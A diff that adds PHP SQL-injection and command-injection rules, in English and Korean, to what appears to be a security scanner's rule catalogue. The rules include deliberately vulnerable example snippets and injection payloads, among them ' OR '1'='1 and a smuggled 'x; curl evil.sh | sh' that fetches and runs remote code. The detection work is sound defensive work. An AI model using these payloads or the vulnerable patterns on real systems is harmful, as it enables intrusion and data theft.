@@ -150,6 +150,40 @@ export const SOURCE_RULES = [
     ],
   },
   {
+    id: "PG-SQL-006",
+    title: "SQL built from dynamic strings in PHP (mysqli, PDO, Laravel, Doctrine)",
+    category: "injection",
+    defaultSeverity: "high",
+    scope: "code",
+    languages: ["php"],
+    standards: { owasp: ["A05:2025"], cwe: ["CWE-89"], cert: [] },
+    rationale: {
+      en: "Request data (`$_GET`, `$_POST`, `$request->input()`) concatenated with `.`, interpolated into a double-quoted string or heredoc, or formatted with `sprintf` into SQL for `mysqli_query`, PDO `query`/`exec`/`prepare`, Laravel `DB::raw`/`DB::select`/`whereRaw` or Doctrine `createQuery` lets an attacker close the string literal and add `' OR '1'='1` or a `UNION SELECT`. That reads other rows, skips a login check and, with stacked statements, changes data. Preparing a built string does not help.",
+      ko: "요청 데이터(`$_GET`, `$_POST`, `$request->input()`)를 `.`로 잇거나 큰따옴표 문자열·heredoc에 끼워 넣거나 `sprintf`로 포맷해서 `mysqli_query`, PDO `query`/`exec`/`prepare`, Laravel `DB::raw`/`DB::select`/`whereRaw`, Doctrine `createQuery`에 넘기는 SQL에 넣으면, 공격자가 문자열 리터럴을 닫고 `' OR '1'='1`이나 `UNION SELECT`를 덧붙일 수 있습니다. 그러면 다른 행을 읽고 로그인 확인을 건너뛰며, 여러 문장이 허용되면 데이터도 바꿉니다. 이미 만들어진 문자열을 `prepare`해도 소용없습니다.",
+    },
+    remediation: {
+      en: "Keep the SQL constant and bind the values: PDO `prepare('... WHERE id = :id')` then `execute(['id' => $id])`, mysqli `bind_param`, Laravel `DB::select('... WHERE id = ?', [$id])` and `whereRaw('a = ?', [$a])`, Doctrine `setParameter`. Names cannot be bound: pick them from an allowlist (`in_array($col, [...], true)` with an early return). Cast numbers first (`(int) $id`). `addslashes` and `mysqli_real_escape_string` are not enough.",
+      ko: "SQL은 고정해 두고 값은 바인딩하세요. PDO는 `prepare('... WHERE id = :id')` 후 `execute(['id' => $id])`, mysqli는 `bind_param`, Laravel은 `DB::select('... WHERE id = ?', [$id])`와 `whereRaw('a = ?', [$a])`, Doctrine은 `setParameter`를 씁니다. 이름은 바인딩할 수 없으니 허용 목록(allowlist)에서 고르세요(`in_array($col, [...], true)`로 확인하고 아니면 바로 반환). 숫자는 먼저 `(int) $id`로 변환하세요. `addslashes`나 `mysqli_real_escape_string`만으로는 충분하지 않습니다.",
+    },
+    examples: [
+      {
+        language: "php",
+        vulnerable:
+          "$result = mysqli_query($conn, \"SELECT * FROM users WHERE name = '\" . $_GET['name'] . \"'\");",
+        safe: "$stmt = $pdo->prepare('SELECT * FROM users WHERE name = :name');\n$stmt->execute(['name' => $_GET['name']]);",
+        note: {
+          en: "`name` set to `' OR '1'='1` returns every user in the first form and nothing in the second.",
+          ko: "`name`이 `' OR '1'='1`이면 첫 번째 코드는 모든 사용자를 반환하고 두 번째 코드는 아무것도 반환하지 않습니다.",
+        },
+      },
+      {
+        language: "php",
+        vulnerable: '$users = DB::select("SELECT * FROM users WHERE id = $id");',
+        safe: "$users = DB::select('SELECT * FROM users WHERE id = ?', [$id]);",
+      },
+    ],
+  },
+  {
     id: "PG-XSS-001",
     title: "Dynamic HTML written to innerHTML/outerHTML/document.write/jQuery .html()",
     category: "xss",
@@ -332,6 +366,35 @@ export const SOURCE_RULES = [
         language: "kotlin",
         vulnerable: 'ProcessBuilder("sh", "-c", "convert $file out.png").start()',
         safe: 'ProcessBuilder("convert", "--", file, "out.png").start()',
+      },
+    ],
+  },
+  {
+    id: "PG-CMD-004",
+    title:
+      "OS command built from dynamic strings in PHP (exec, system, shell_exec, backticks, Symfony Process)",
+    category: "command_execution",
+    defaultSeverity: "high",
+    scope: "code",
+    languages: ["php"],
+    standards: { owasp: ["A05:2025"], cwe: ["CWE-78"], cert: [] },
+    rationale: {
+      en: "Request data in the string passed to `exec`, `system`, `shell_exec`, `passthru`, `popen`, `proc_open`, a backtick command or Symfony `Process::fromShellCommandline` is read by a shell, so an attacker can append commands with `;`, `&&`, `|` or `$(...)` and run them as the web server's user. `escapeshellarg` quotes one argument but not an option-like value or a program name. An argument array with a fixed program starts no shell and is not reported.",
+      ko: "`exec`, `system`, `shell_exec`, `passthru`, `popen`, `proc_open`, 백틱 명령, Symfony `Process::fromShellCommandline`에 넘기는 문자열에 요청 데이터가 들어가면 셸이 해석하므로, 공격자가 `;`, `&&`, `|`, `$(...)`로 명령을 덧붙여 웹 서버 사용자 권한으로 실행할 수 있습니다. `escapeshellarg`는 인자 하나만 따옴표로 감싸며 옵션처럼 보이는 값이나 프로그램 이름은 막지 못합니다. 프로그램이 고정된 인자 배열은 셸을 시작하지 않으므로 보고하지 않습니다.",
+    },
+    remediation: {
+      en: "Do not build a command string. Pass the program and arguments as an array so no shell is involved: `new Process(['git', 'log', '--end-of-options', $ref, '--'])` or `proc_open([...], $descriptors, $pipes)`. Check each argument against an allowlist (`preg_match('/^[A-Za-z0-9._-]+$/', $v)` with an early return) and mark where options end (`--`). If a shell string is unavoidable, wrap every value in `escapeshellarg()`. A PHP extension (zip, GD) avoids the process.",
+      ko: "명령 문자열을 만들지 마세요. 프로그램과 인자를 배열로 넘기면 셸이 개입하지 않습니다: `new Process(['git', 'log', '--end-of-options', $ref, '--'])` 또는 `proc_open([...], $descriptors, $pipes)`. 인자는 허용 목록(allowlist)으로 검증하고(`preg_match('/^[A-Za-z0-9._-]+$/', $v)`로 확인한 뒤 아니면 바로 반환), 옵션이 끝나는 지점(`--`)을 표시하세요. 셸 문자열이 불가피하면 모든 값을 `escapeshellarg()`로 감싸세요. zip, GD 같은 PHP 확장을 쓰면 프로세스 실행을 피할 수 있습니다.",
+    },
+    examples: [
+      {
+        language: "php",
+        vulnerable: "system(\"ping -c 1 \" . $_GET['host']);",
+        safe: "$process = new Process(['ping', '-c', '1', $host]);\n$process->run();",
+        note: {
+          en: "`host` set to `x; curl evil.sh | sh` runs the second command in the first form; the second form passes it to `ping` as one argument.",
+          ko: "`host`가 `x; curl evil.sh | sh`이면 첫 번째 코드는 두 번째 명령까지 실행하고, 두 번째 코드는 값 전체를 `ping`의 인자 하나로만 넘깁니다.",
+        },
       },
     ],
   },
@@ -593,4 +656,9 @@ export const MYBATIS_RULE_IDS: SourceRuleId[] = ["PG-SQL-005"];
 /** Rules that run on Java and Kotlin sources. */
 export const JVM_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
   rule.languages.some((language: RuleLanguage) => language === "java" || language === "kotlin"),
+).map((rule) => rule.id);
+
+/** Rules that run on PHP sources. */
+export const PHP_RULE_IDS: SourceRuleId[] = SOURCE_RULES.filter((rule) =>
+  rule.languages.some((language: RuleLanguage) => language === "php"),
 ).map((rule) => rule.id);
